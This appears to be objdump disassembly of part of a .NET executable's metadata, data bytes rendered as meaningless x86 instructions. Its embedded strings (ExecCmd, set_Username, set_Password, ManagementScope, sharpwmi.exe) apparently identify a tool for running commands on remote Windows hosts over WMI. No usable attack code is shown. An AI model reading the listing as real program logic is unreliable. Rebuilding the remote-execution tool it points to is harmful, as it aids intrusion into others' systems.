  4025ea:	00 00                	add    %al,(%eax)
  4025ec:	23 47 55             	and    0x55(%edi),%eax
  4025ef:	49                   	dec    %ecx
  4025f0:	44                   	inc    %esp
  4025f1:	00 00                	add    %al,(%eax)
  4025f3:	00 38                	add    %bh,(%eax)
  4025f5:	0f 00 00             	sldt   (%eax)
  4025f8:	d4 01                	aam    $0x1
  4025fa:	00 00                	add    %al,(%eax)
  4025fc:	23 42 6c             	and    0x6c(%edx),%eax
  4025ff:	6f                   	outsl  %ds:(%esi),(%dx)
  402600:	62 00                	bound  %eax,(%eax)
  402602:	00 00                	add    %al,(%eax)
  402604:	00 00                	add    %al,(%eax)
  402606:	00 00                	add    %al,(%eax)
  402608:	02 00                	add    (%eax),%al
  40260a:	00 01                	add    %al,(%ecx)
  40260c:	57                   	push   %edi
  40260d:	15 02 00 09 00       	adc    $0x90002,%eax
  402612:	00 00                	add    %al,(%eax)
  402614:	00 fa                	add    %bh,%dl
  402616:	01 33                	add    %esi,(%ebx)
  402618:	00 16                	add    %dl,(%esi)
  40261a:	00 00                	add    %al,(%eax)
  40261c:	01 00                	add    %eax,(%eax)
  40261e:	00 00                	add    %al,(%eax)
  402620:	21 00                	and    %eax,(%eax)
  402622:	00 00                	add    %al,(%eax)
  402624:	02 00                	add    (%eax),%al
  402626:	00 00                	add    %al,(%eax)
  402628:	01 00                	add    %eax,(%eax)
  40262a:	00 00                	add    %al,(%eax)
  40262c:	06                   	push   %es
  40262d:	00 00                	add    %al,(%eax)
  40262f:	00 05 00 00 00 2d    	add    %al,0x2d000000
  402635:	00 00                	add    %al,(%eax)
  402637:	00 0e                	add    %cl,(%esi)
  402639:	00 00                	add    %al,(%eax)
  40263b:	00 03                	add    %al,(%ebx)
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 01                	add    %al,(%ecx)
  402641:	00 00                	add    %al,(%eax)
  402643:	00 02                	add    %al,(%edx)
  402645:	00 00                	add    %al,(%eax)
  402647:	00 00                	add    %al,(%eax)
  402649:	00 2a                	add    %ch,(%edx)
  40264b:	02 01                	add    (%ecx),%al
  40264d:	00 00                	add    %al,(%eax)
  40264f:	00 00                	add    %al,(%eax)
  402651:	00 06                	add    %al,(%esi)
  402653:	00 9f 01 4d 03 06    	add    %bl,0x6034d01(%edi)
  402659:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40265c:	4d                   	dec    %ebp
  40265d:	03 06                	add    (%esi),%eax
  40265f:	00 d3                	add    %dl,%bl
  402661:	00 1b                	add    %bl,(%ebx)
  402663:	03 0f                	add    (%edi),%ecx
  402665:	00 6d 03             	add    %ch,0x3(%ebp)
  402668:	00 00                	add    %al,(%eax)
  40266a:	06                   	push   %es
  40266b:	00 fb                	add    %bh,%bl
  40266d:	00 f9                	add    %bh,%cl
  40266f:	02 06                	add    (%esi),%al
  402671:	00 82 01 f9 02 06    	add    %al,0x602f901(%edx)
  402677:	00 63 01             	add    %ah,0x1(%ebx)
  40267a:	f9                   	stc
  40267b:	02 06                	add    (%esi),%al
  40267d:	00 f3                	add    %dh,%bl
  40267f:	01 f9                	add    %edi,%ecx
  402681:	02 06                	add    (%esi),%al
  402683:	00 bf 01 f9 02 06    	add    %bh,0x602f901(%edi)
  402689:	00 d8                	add    %bl,%al
  40268b:	01 f9                	add    %edi,%ecx
  40268d:	02 06                	add    (%esi),%al
  40268f:	00 12                	add    %dl,(%edx)
  402691:	01 f9                	add    %edi,%ecx
  402693:	02 06                	add    (%esi),%al
  402695:	00 e7                	add    %ah,%bh
  402697:	00 2e                	add    %ch,(%esi)
  402699:	03 06                	add    (%esi),%eax
  40269b:	00 c5                	add    %al,%ch
  40269d:	00 2e                	add    %ch,(%esi)
  40269f:	03 06                	add    (%esi),%eax
  4026a1:	00 46 01             	add    %al,0x1(%esi)
  4026a4:	f9                   	stc
  4026a5:	02 06                	add    (%esi),%al
  4026a7:	00 2d 01 51 02 06    	add    %ch,0x6025101
  4026ad:	00 40 04             	add    %al,0x4(%eax)
  4026b0:	db 02                	fildl  (%edx)
  4026b2:	0a 00                	or     (%eax),%al
  4026b4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4026b5:	00 4f 04             	add    %cl,0x4(%edi)
  4026b8:	0a 00                	or     (%eax),%al
  4026ba:	03 04 4f             	add    (%edi,%ecx,2),%eax
  4026bd:	04 0a                	add    $0xa,%al
  4026bf:	00 21                	add    %ah,(%ecx)
  4026c1:	04 4f                	add    $0x4f,%al
  4026c3:	04 0a                	add    $0xa,%al
  4026c5:	00 cc                	add    %cl,%ah
  4026c7:	03 4f 04             	add    0x4(%edi),%ecx
  4026ca:	0a 00                	or     (%eax),%al
  4026cc:	9e                   	sahf
  4026cd:	02 4f 04             	add    0x4(%edi),%cl
  4026d0:	0a 00                	or     (%eax),%al
  4026d2:	de 03                	fiadds (%ebx)
  4026d4:	4f                   	dec    %edi
  4026d5:	04 0a                	add    $0xa,%al
  4026d7:	00 36                	add    %dh,(%esi)
  4026d9:	04 4f                	add    $0x4f,%al
  4026db:	04 0a                	add    $0xa,%al
  4026dd:	00 b8 03 4f 04 06    	add    %bh,0x6044f03(%eax)
  4026e3:	00 77 00             	add    %dh,0x0(%edi)
  4026e6:	db 02                	fildl  (%edx)
  4026e8:	06                   	push   %es
  4026e9:	00 48 02             	add    %cl,0x2(%eax)
  4026ec:	71 04                	jno    0x4026f2
  4026ee:	06                   	push   %es
  4026ef:	00 69 04             	add    %ch,0x4(%ecx)
  4026f2:	db 02                	fildl  (%edx)
  4026f4:	06                   	push   %es
  4026f5:	00 88 00 db 02 06    	add    %cl,0x602db00(%eax)
  4026fb:	00 97 02 db 02 0a    	add    %dl,0xa02db02(%edi)
  402701:	00 b6 02 4f 04 06    	add    %dh,0x6044f02(%esi)
  402707:	00 24 00             	add    %ah,(%eax,%eax,1)
  40270a:	37                   	aaa
  40270b:	02 06                	add    (%esi),%al
  40270d:	00 83 00 11 00 06    	add    %al,0x6001100(%ebx)
  402713:	00 01                	add    %al,(%ecx)
  402715:	00 db                	add    %bl,%bl
  402717:	02 00                	add    (%eax),%al
  402719:	00 00                	add    %al,(%eax)
  40271b:	00 08                	add    %cl,(%eax)
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 00                	add    %al,(%eax)
  402721:	00 01                	add    %al,(%ecx)
  402723:	00 01                	add    %al,(%ecx)
  402725:	00 00                	add    %al,(%eax)
  402727:	00 10                	add    %dl,(%eax)
  402729:	00 ad 02 ad 02 41    	add    %ch,0x4102ad02(%ebp)
  40272f:	00 01                	add    %al,(%ecx)
  402731:	00 01                	add    %al,(%ecx)
  402733:	00 06                	add    %al,(%esi)
  402735:	00 b7 00 db 00 50    	add    %dh,0x5000db00(%edi)
  40273b:	20 00                	and    %al,(%eax)
  40273d:	00 00                	add    %al,(%eax)
  40273f:	00 86 00 2b 00 df    	add    %al,-0x20ffd500(%esi)
  402745:	00 01                	add    %al,(%ecx)
  402747:	00 c4                	add    %al,%ah
  402749:	20 00                	and    %al,(%eax)
  40274b:	00 00                	add    %al,(%eax)
  40274d:	00 96 00 6a 00 e4    	add    %dl,-0x1bff9600(%esi)
  402753:	00 02                	add    %al,(%edx)
  402755:	00 d8                	add    %bl,%al
  402757:	20 00                	and    %al,(%eax)
  402759:	00 00                	add    %al,(%eax)
  40275b:	00 96 00 51 00 e4    	add    %dl,-0x1bffaf00(%esi)
  402761:	00 03                	add    %al,(%ebx)
  402763:	00 f8                	add    %bh,%al
  402765:	20 00                	and    %al,(%eax)
  402767:	00 00                	add    %al,(%eax)
  402769:	00 86 00 0b 03 e9    	add    %al,-0x16fcf500(%esi)
  40276f:	00 04 00             	add    %al,(%eax,%eax,1)
  402772:	82 25 00 00 00 00 91 	andb   $0x91,0x0
  402779:	00 e2                	add    %ah,%dl
  40277b:	02 ef                	add    %bh,%ch
  40277d:	00 05 00 8f 25 00    	add    %al,0x258f00
  402783:	00 00                	add    %al,(%eax)
  402785:	00 86 18 15 03 06    	add    %al,0x6031518(%esi)
  40278b:	00 06                	add    %al,(%esi)
  40278d:	00 00                	add    %al,(%eax)
  40278f:	00 01                	add    %al,(%ecx)
  402791:	00 33                	add    %dh,(%ebx)
  402793:	00 00                	add    %al,(%eax)
  402795:	00 01                	add    %al,(%ecx)
  402797:	00 61 04             	add    %ah,0x4(%ecx)
  40279a:	00 00                	add    %al,(%eax)
  40279c:	01 00                	add    %eax,(%eax)
  40279e:	61                   	popa
  40279f:	04 00                	add    $0x0,%al
  4027a1:	00 01                	add    %al,(%ecx)
  4027a3:	00 a7 03 00 00 01    	add    %ah,0x1000003(%edi)
  4027a9:	00 a7 03 09 00 15    	add    %ah,0x15000903(%edi)
  4027af:	03 01                	add    (%ecx),%eax
  4027b1:	00 11                	add    %dl,(%ecx)
  4027b3:	00 15 03 06 00 19    	add    %dl,0x19000603
  4027b9:	00 15 03 0a 00 29    	add    %dl,0x29000a03
  4027bf:	00 15 03 10 00 31    	add    %dl,0x31001003
  4027c5:	00 15 03 10 00 39    	add    %dl,0x39001003
  4027cb:	00 15 03 10 00 41    	add    %dl,0x41001003
  4027d1:	00 15 03 10 00 49    	add    %dl,0x49001003
  4027d7:	00 15 03 10 00 51    	add    %dl,0x51001003
  4027dd:	00 15 03 10 00 59    	add    %dl,0x59001003
  4027e3:	00 15 03 10 00 61    	add    %dl,0x61001003
  4027e9:	00 15 03 15 00 69    	add    %dl,0x69001503
  4027ef:	00 15 03 10 00 71    	add    %dl,0x71001003
  4027f5:	00 15 03 10 00 79    	add    %dl,0x79001003
  4027fb:	00 15 03 10 00 a9    	add    %dl,0xa9001003
  402801:	00 15 03 10 00 b1    	add    %dl,0xb1001003
  402807:	00 15 03 06 00 91    	add    %dl,0x91000603
  40280d:	00 15 03 22 00 b9    	add    %dl,0xb9002203
  402813:	00 ef                	add    %ch,%bh
  402815:	03 2c 00             	add    (%eax,%eax,1),%ebp
  402818:	99                   	cltd
  402819:	00 d2                	add    %dl,%dl
  40281b:	02 32                	add    (%edx),%dh
  40281d:	00 c1                	add    %al,%cl
  40281f:	00 15 03 06 00 b9    	add    %dl,0xb9000603
  402825:	00 37                	add    %dh,(%edi)
  402827:	00 38                	add    %bh,(%eax)
  402829:	00 c9                	add    %cl,%cl
  40282b:	00 bd 00 06 00 d1    	add    %bh,-0x2efffa00(%ebp)
  402831:	00 5e 00             	add    %bl,0x0(%esi)
  402834:	42                   	inc    %edx
  402835:	00 d1                	add    %dl,%cl
  402837:	00 9e 03 47 00 d9    	add    %bl,-0x26ffb8fd(%esi)
  40283d:	00 7c 02 4d          	add    %bh,0x4d(%edx,%eax,1)
  402841:	00 d9                	add    %bl,%cl
  402843:	00 6b 02             	add    %ch,0x2(%ebx)
  402846:	58                   	pop    %eax
  402847:	00 d1                	add    %dl,%cl
  402849:	00 94 02 5e 00 e1 00 	add    %dl,0xe1005e(%edx,%eax,1)
  402850:	9d                   	popf
  402851:	00 8b 00 e9 00 7d    	add    %cl,0x7d00e900(%ebx)
  402857:	04 90                	add    $0x90,%al
  402859:	00 a1 00 15 03 06    	add    %ah,0x6031500(%ecx)
  40285f:	00 e9                	add    %ch,%cl
  402861:	00 13                	add    %dl,(%ebx)
  402863:	04 96                	add    $0x96,%al
  402865:	00 89 00 15 03 9d    	add    %cl,-0x62fceb00(%ecx)
  40286b:	00 89 00 ac 03 a4    	add    %cl,-0x5bfc5400(%ecx)
  402871:	00 a1 00 e7 02 a9    	add    %ah,-0x56fd1900(%ecx)
  402877:	00 a1 00 7c 03 15    	add    %ah,0x15037c00(%ecx)
  40287d:	00 89 00 47 04 06    	add    %cl,0x6044700(%ecx)
  402883:	00 e9                	add    %ch,%cl
  402885:	00 13                	add    %dl,(%ebx)
  402887:	04 af                	add    $0xaf,%al
  402889:	00 f9                	add    %bh,%cl
  40288b:	00 0f                	add    %cl,(%edi)
  40288d:	03 b5 00 99 00 c9    	add    -0x36ff6700(%ebp),%esi
  402893:	02 ba 00 81 00 8b    	add    -0x74ff7f00(%edx),%bh
  402899:	02 bf 00 01 01 91    	add    -0x6efeff00(%edi),%bh
  40289f:	03 58 00             	add    0x0(%eax),%ebx
  4028a2:	e9 00 1a 04 c3       	jmp    0xc34442a7
  4028a7:	00 a1 00 90 00 10    	add    %ah,0x10009000(%ecx)
  4028ad:	00 a1 00 44 00 10    	add    %ah,0x10004400(%ecx)
  4028b3:	00 81 00 15 03 06    	add    %al,0x6031500(%ecx)
  4028b9:	00 2e                	add    %ch,(%esi)
  4028bb:	00 0b                	add    %cl,(%ebx)
  4028bd:	00 f5                	add    %dh,%ch
  4028bf:	00 2e                	add    %ch,(%esi)
  4028c1:	00 13                	add    %dl,(%ebx)
  4028c3:	00 fe                	add    %bh,%dh
  4028c5:	00 2e                	add    %ch,(%esi)
  4028c7:	00 1b                	add    %bl,(%ebx)
  4028c9:	00 1d 01 2e 00 23    	add    %bl,0x23002e01
  4028cf:	00 26                	add    %ah,(%esi)
  4028d1:	01 2e                	add    %ebp,(%esi)
  4028d3:	00 2b                	add    %ch,(%ebx)
  4028d5:	00 34 01             	add    %dh,(%ecx,%eax,1)
  4028d8:	2e 00 33             	add    %dh,%cs:(%ebx)
  4028db:	00 34 01             	add    %dh,(%ecx,%eax,1)
  4028de:	2e 00 3b             	add    %bh,%cs:(%ebx)
  4028e1:	00 34 01             	add    %dh,(%ecx,%eax,1)
  4028e4:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  4028e8:	26 01 2e             	add    %ebp,%es:(%esi)
  4028eb:	00 4b 00             	add    %cl,0x0(%ebx)
  4028ee:	3a 01                	cmp    (%ecx),%al
  4028f0:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4028f4:	34 01                	xor    $0x1,%al
  4028f6:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  4028fa:	34 01                	xor    $0x1,%al
  4028fc:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402900:	52                   	push   %edx
  402901:	01 2e                	add    %ebp,(%esi)
  402903:	00 6b 00             	add    %ch,0x0(%ebx)
  402906:	7c 01                	jl     0x402909
  402908:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  40290c:	89 01                	mov    %eax,(%ecx)
  40290e:	1a 00                	sbb    (%eax),%al
  402910:	53                   	push   %ebx
  402911:	00 64 00 04          	add    %ah,0x4(%eax,%eax,1)
  402915:	80 00 00             	addb   $0x0,(%eax)
  402918:	01 00                	add    %eax,(%eax)
	...
  402926:	ad                   	lods   %ds:(%esi),%eax
  402927:	02 00                	add    (%eax),%al
  402929:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402934:	00 00                	add    %al,(%eax)
  402936:	c9                   	leave
  402937:	00 1b                	add    %bl,(%ebx)
  402939:	00 00                	add    %al,(%eax)
  40293b:	00 00                	add    %al,(%eax)
  40293d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402948:	00 00                	add    %al,(%eax)
  40294a:	d2 00                	rolb   %cl,(%eax)
  40294c:	4f                   	dec    %edi
  40294d:	04 00                	add    $0x0,%al
  40294f:	00 00                	add    %al,(%eax)
  402951:	00 00                	add    %al,(%eax)
  402953:	00 00                	add    %al,(%eax)
  402955:	55                   	push   %ebp
  402956:	49                   	dec    %ecx
  402957:	6e                   	outsb  %ds:(%esi),(%dx)
  402958:	74 33                	je     0x40298d
  40295a:	32 00                	xor    (%eax),%al
  40295c:	3c 4d                	cmp    $0x4d,%al
  40295e:	6f                   	outsl  %ds:(%esi),(%dx)
  40295f:	64 75 6c             	fs jne 0x4029ce
  402962:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  402967:	73 74                	jae    0x4029dd
  402969:	65 6d                	gs insl (%dx),%es:(%edi)
  40296b:	2e 49                	cs dec %ecx
  40296d:	4f                   	dec    %edi
  40296e:	00 6d 73             	add    %ch,0x73(%ebp)
  402971:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402974:	6c                   	insb   (%dx),%es:(%edi)
  402975:	69 62 00 54 68 72 65 	imul   $0x65726854,0x0(%edx),%esp
  40297c:	61                   	popa
  40297d:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  402981:	65 63 43 6d          	arpl   %eax,%gs:0x6d(%ebx)
  402985:	64 00 63 6d          	add    %ah,%fs:0x6d(%ebx)
  402989:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  40298d:	76 6f                	jbe    0x4029fe
  40298f:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  402993:	74 68                	je     0x4029fd
  402995:	6f                   	outsl  %ds:(%esi),(%dx)
  402996:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  40299a:	74 5f                	je     0x4029fb
  40299c:	50                   	push   %eax
  40299d:	61                   	popa
  40299e:	73 73                	jae    0x402a13
  4029a0:	77 6f                	ja     0x402a11
  4029a2:	72 64                	jb     0x402a08
  4029a4:	00 42 61             	add    %al,0x61(%edx)
  4029a7:	73 65                	jae    0x402a0e
  4029a9:	36 34 44             	ss xor $0x44,%al
  4029ac:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4029b0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4029b4:	74 5f                	je     0x402a15
  4029b6:	55                   	push   %ebp
  4029b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4029b8:	69 63 6f 64 65 00 42 	imul   $0x42006564,0x6f(%ebx),%esp
  4029bf:	61                   	popa
  4029c0:	73 65                	jae    0x402a27
  4029c2:	36 34 45             	ss xor $0x45,%al
  4029c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4029c6:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4029c9:	65 00 49 44          	add    %cl,%gs:0x44(%ecx)
  4029cd:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4029d4:	6c                   	insb   (%dx),%es:(%edi)
  4029d5:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4029d9:	6c                   	insb   (%dx),%es:(%edi)
  4029da:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4029de:	6e                   	outsb  %ds:(%esi),(%dx)
  4029df:	73 6f                	jae    0x402a50
  4029e1:	6c                   	insb   (%dx),%es:(%edi)
  4029e2:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4029e6:	74 5f                	je     0x402a47
  4029e8:	55                   	push   %ebp
  4029e9:	73 65                	jae    0x402a50
  4029eb:	72 6e                	jb     0x402a5b
  4029ed:	61                   	popa
  4029ee:	6d                   	insl   (%dx),%es:(%edi)
  4029ef:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4029f3:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  4029fa:	00 
  4029fb:	4d                   	dec    %ebp
  4029fc:	61                   	popa
  4029fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4029fe:	61                   	popa
  4029ff:	67 65 6d             	gs insl (%dx),%es:(%di)
  402a02:	65 6e                	outsb  %gs:(%esi),(%dx)
  402a04:	74 53                	je     0x402a59
  402a06:	63 6f 70             	arpl   %ebp,0x70(%edi)
  402a09:	65 00 73 63          	add    %dh,%gs:0x63(%ebx)
  402a0d:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0e:	70 65                	jo     0x402a75
  402a10:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  402a14:	70 6f                	jo     0x402a85
  402a16:	73 65                	jae    0x402a7d
  402a18:	00 47 75             	add    %al,0x75(%edi)
  402a1b:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402a22:	62 
  402a23:	75 74                	jne    0x402a99
  402a25:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402a2a:	75 67                	jne    0x402a93
  402a2c:	67 61                	addr16 popa
  402a2e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402a32:	74 74                	je     0x402aa8
  402a34:	72 69                	jb     0x402a9f
  402a36:	62 75 74             	bound  %esi,0x74(%ebp)
  402a39:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402a3d:	6d                   	insl   (%dx),%es:(%edi)
  402a3e:	56                   	push   %esi
  402a3f:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402a46:	74 74                	je     0x402abc
  402a48:	72 69                	jb     0x402ab3
  402a4a:	62 75 74             	bound  %esi,0x74(%ebp)
  402a4d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402a51:	73 65                	jae    0x402ab8
  402a53:	6d                   	insl   (%dx),%es:(%edi)
  402a54:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402a58:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402a5f:	72 
  402a60:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402a67:	73 73                	jae    0x402adc
  402a69:	65 6d                	gs insl (%dx),%es:(%edi)
  402a6b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402a6f:	72 61                	jb     0x402ad2
  402a71:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  402a74:	61                   	popa
  402a75:	72 6b                	jb     0x402ae2
  402a77:	41                   	inc    %ecx
  402a78:	74 74                	je     0x402aee
  402a7a:	72 69                	jb     0x402ae5
  402a7c:	62 75 74             	bound  %esi,0x74(%ebp)
  402a7f:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402a84:	67 65 74 46          	addr16 gs je 0x402ace
  402a88:	72 61                	jb     0x402aeb
  402a8a:	6d                   	insl   (%dx),%es:(%edi)
  402a8b:	65 77 6f             	gs ja  0x402afd
  402a8e:	72 6b                	jb     0x402afb
  402a90:	41                   	inc    %ecx
  402a91:	74 74                	je     0x402b07
  402a93:	72 69                	jb     0x402afe
  402a95:	62 75 74             	bound  %esi,0x74(%ebp)
  402a98:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402a9c:	73 65                	jae    0x402b03
  402a9e:	6d                   	insl   (%dx),%es:(%edi)
  402a9f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402aa3:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402aaa:	69 
  402aab:	6f                   	outsl  %ds:(%esi),(%dx)
  402aac:	6e                   	outsb  %ds:(%esi),(%dx)
  402aad:	41                   	inc    %ecx
  402aae:	74 74                	je     0x402b24
  402ab0:	72 69                	jb     0x402b1b
  402ab2:	62 75 74             	bound  %esi,0x74(%ebp)
  402ab5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ab9:	73 65                	jae    0x402b20
  402abb:	6d                   	insl   (%dx),%es:(%edi)
  402abc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402ac0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  402ac2:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402ac8:	74 69                	je     0x402b33
  402aca:	6f                   	outsl  %ds:(%esi),(%dx)
  402acb:	6e                   	outsb  %ds:(%esi),(%dx)
  402acc:	41                   	inc    %ecx
  402acd:	74 74                	je     0x402b43
  402acf:	72 69                	jb     0x402b3a
  402ad1:	62 75 74             	bound  %esi,0x74(%ebp)
  402ad4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ad8:	73 65                	jae    0x402b3f
  402ada:	6d                   	insl   (%dx),%es:(%edi)
  402adb:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402adf:	65 73 63             	gs jae 0x402b45
  402ae2:	72 69                	jb     0x402b4d
  402ae4:	70 74                	jo     0x402b5a
  402ae6:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402aed:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  402af4:	6f                   	outsl  %ds:(%esi),(%dx)
  402af5:	6d                   	insl   (%dx),%es:(%edi)
  402af6:	70 69                	jo     0x402b61
  402af8:	6c                   	insb   (%dx),%es:(%edi)
  402af9:	61                   	popa
  402afa:	74 69                	je     0x402b65
  402afc:	6f                   	outsl  %ds:(%esi),(%dx)
  402afd:	6e                   	outsb  %ds:(%esi),(%dx)
  402afe:	52                   	push   %edx
  402aff:	65 6c                	gs insb (%dx),%es:(%edi)
  402b01:	61                   	popa
  402b02:	78 61                	js     0x402b65
  402b04:	74 69                	je     0x402b6f
  402b06:	6f                   	outsl  %ds:(%esi),(%dx)
  402b07:	6e                   	outsb  %ds:(%esi),(%dx)
  402b08:	73 41                	jae    0x402b4b
  402b0a:	74 74                	je     0x402b80
  402b0c:	72 69                	jb     0x402b77
  402b0e:	62 75 74             	bound  %esi,0x74(%ebp)
  402b11:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402b15:	73 65                	jae    0x402b7c
  402b17:	6d                   	insl   (%dx),%es:(%edi)
  402b18:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402b1c:	72 6f                	jb     0x402b8d
  402b1e:	64 75 63             	fs jne 0x402b84
  402b21:	74 41                	je     0x402b64
  402b23:	74 74                	je     0x402b99
  402b25:	72 69                	jb     0x402b90
  402b27:	62 75 74             	bound  %esi,0x74(%ebp)
  402b2a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402b2e:	73 65                	jae    0x402b95
  402b30:	6d                   	insl   (%dx),%es:(%edi)
  402b31:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402b35:	6f                   	outsl  %ds:(%esi),(%dx)
  402b36:	70 79                	jo     0x402bb1
  402b38:	72 69                	jb     0x402ba3
  402b3a:	67 68 74 41 74 74    	addr16 push $0x74744174
  402b40:	72 69                	jb     0x402bab
  402b42:	62 75 74             	bound  %esi,0x74(%ebp)
  402b45:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402b49:	73 65                	jae    0x402bb0
  402b4b:	6d                   	insl   (%dx),%es:(%edi)
  402b4c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402b50:	6f                   	outsl  %ds:(%esi),(%dx)
  402b51:	6d                   	insl   (%dx),%es:(%edi)
  402b52:	70 61                	jo     0x402bb5
  402b54:	6e                   	outsb  %ds:(%esi),(%dx)
  402b55:	79 41                	jns    0x402b98
  402b57:	74 74                	je     0x402bcd
  402b59:	72 69                	jb     0x402bc4
  402b5b:	62 75 74             	bound  %esi,0x74(%ebp)
  402b5e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402b62:	6e                   	outsb  %ds:(%esi),(%dx)
  402b63:	74 69                	je     0x402bce
  402b65:	6d                   	insl   (%dx),%es:(%edi)
  402b66:	65 43                	gs inc %ebx
  402b68:	6f                   	outsl  %ds:(%esi),(%dx)
  402b69:	6d                   	insl   (%dx),%es:(%edi)
  402b6a:	70 61                	jo     0x402bcd
  402b6c:	74 69                	je     0x402bd7
  402b6e:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402b71:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402b78:	69 
  402b79:	62 75 74             	bound  %esi,0x74(%ebp)
  402b7c:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
  402b80:	61                   	popa
  402b81:	72 70                	jb     0x402bf3
  402b83:	77 6d                	ja     0x402bf2
  402b85:	69 2e 65 78 65 00    	imul   $0x657865,(%esi),%ebp
  402b8b:	53                   	push   %ebx
  402b8c:	79 73                	jns    0x402c01
  402b8e:	74 65                	je     0x402bf5
  402b90:	6d                   	insl   (%dx),%es:(%edi)
  402b91:	2e 54                	cs push %esp
  402b93:	68 72 65 61 64       	push   $0x64616572
  402b98:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  402b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba0:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
  402ba7:	73 
  402ba8:	74 65                	je     0x402c0f
  402baa:	6d                   	insl   (%dx),%es:(%edi)
  402bab:	2e 52                	cs push %edx
  402bad:	75 6e                	jne    0x402c1d
  402baf:	74 69                	je     0x402c1a
  402bb1:	6d                   	insl   (%dx),%es:(%edi)
  402bb2:	65 2e 56             	gs cs push %esi
  402bb5:	65 72 73             	gs jb  0x402c2b
  402bb8:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402bbf:	46                   	inc    %esi
  402bc0:	72 6f                	jb     0x402c31
  402bc2:	6d                   	insl   (%dx),%es:(%edi)
  402bc3:	42                   	inc    %edx
  402bc4:	61                   	popa
  402bc5:	73 65                	jae    0x402c2c
  402bc7:	36 34 53             	ss xor $0x53,%al
  402bca:	74 72                	je     0x402c3e
  402bcc:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  402bd3:	61                   	popa
  402bd4:	73 65                	jae    0x402c3b
  402bd6:	36 34 53             	ss xor $0x53,%al
  402bd9:	74 72                	je     0x402c4d
  402bdb:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  402be2:	74 72                	je     0x402c56
  402be4:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  402beb:	53                   	push   %ebx
  402bec:	74 72                	je     0x402c60
  402bee:	69 6e 67 00 4d 61 6e 	imul   $0x6e614d00,0x67(%esi),%ebp
  402bf5:	61                   	popa
  402bf6:	67 65 6d             	gs insl (%dx),%es:(%di)
  402bf9:	65 6e                	outsb  %gs:(%esi),(%dx)
